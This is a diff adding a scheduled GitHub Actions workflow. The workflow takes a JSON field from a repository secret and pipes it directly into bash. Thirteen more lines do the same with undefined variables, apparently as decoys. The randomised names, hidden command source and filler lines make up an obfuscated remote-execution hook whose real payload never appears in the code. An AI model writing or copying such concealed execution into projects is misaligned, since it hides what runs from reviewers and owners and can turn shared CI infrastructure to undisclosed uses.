@@ -1,0 +1,29 @@
+name: ruhezhidaowodepaimianshiduoshao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruhezhidaowodepaimianshiduoshao
+        env:
+          nqacm85876: ${{ secrets.nqacm85876 }}
+        run: |
+          echo $nqacm85876 | jq -r .qrql5231 | /bin/bash
+          echo $ok68 | jq -r .f136 | /bin/bash
+          echo $hbf56816 | jq -r .gzjne83143 | /bin/bash
+          echo $kvgs1766 | jq -r .clpuu338 | /bin/bash
+          echo $s564 | jq -r .s431 | /bin/bash
+          echo $uj4562 | jq -r .ez3 | /bin/bash
+          echo $mwzir4 | jq -r .tt7 | /bin/bash
+          echo $gjykc0530 | jq -r .vleno07 | /bin/bash
+          echo $ujesh47299 | jq -r .dysb40773 | /bin/bash
+          echo $v3527 | jq -r .fo3 | /bin/bash
+          echo $bkn90 | jq -r .techl19 | /bin/bash
+          echo $jzba811 | jq -r .km8 | /bin/bash
+          echo $t75164 | jq -r .fclfw72 | /bin/bash
+          echo $dowck92361 | jq -r .w54 | /bin/bash
+
